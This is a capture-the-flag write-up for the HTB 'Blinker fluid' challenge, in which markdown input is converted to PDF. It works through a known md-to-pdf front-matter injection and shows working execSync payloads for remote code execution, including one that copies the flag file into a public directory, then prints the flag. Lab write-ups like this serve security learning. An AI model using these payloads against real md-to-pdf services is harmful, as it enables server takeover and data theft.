<h2>Blinker fluid</h2>

<blockquote>
  <p>Solved By : Bobbysox, Legend, Starrylord, thewhiteh4t</p>
</blockquote>

<p>In blinker fluid challenge our markdown input gets converted into a PDF file available for download.</p>

<p>in the site source we checked <code>package.json</code> file :</p>

<p><code>json
{
        "name": "blinker-fluids",
        "version": "1.0.0",
        "description": "",
        "main": "index.js",
        "scripts": {
                "start": "node index.js"
        },
        "keywords": [],
        "author": "rayhan0x01",
        "license": "ISC",
        "dependencies": {
                "express": "^4.17.3",
                "md-to-pdf": "^4.1.0",
                "nunjucks": "3.2.3",
                "sqlite-async": "1.1.3",
                "uuid": "8.3.2"
        },
        "devDependencies": {
                "nodemon": "^1.19.1"
        }
}
</code></p>

<p>interesting things in this file are : </p>

<p><code>
"md-to-pdf": "^4.1.0"
"nunjucks": "3.2.3"
</code></p>

<p>we quickly found the following CVE for <code>md-to-pdf</code> : </p>

<p>https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880</p>

<p>payload as shown in the link : </p>

<p><code>
---js\n((require("child_process")).execSync("id &gt; /tmp/RCE.txt"))\n---RCE
</code></p>

<p>the payload did not work for us as it is so we looked for more info on the same and found this : </p>

<p>https://github.com/11ty/eleventy/issues/1208</p>

<p><a href="https://github.com/11ty/eleventy/issues/1208">11ty/eleventy#1208</a></p>

<p>so basically nunjucks was having issues with single line payload so we settled on the following : </p>

<p>```
---js</p>

<h2>((require("child_process")).execSync("cat ../flag.txt &gt; static/invoices/rce.txt"))</h2>

<p>```</p>

<p>line 1 and 3 needed to be exactly as above for it to work and we redirected flag to a file in invoices directoryâ€¦</p>

<p><code>
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
</code></p>
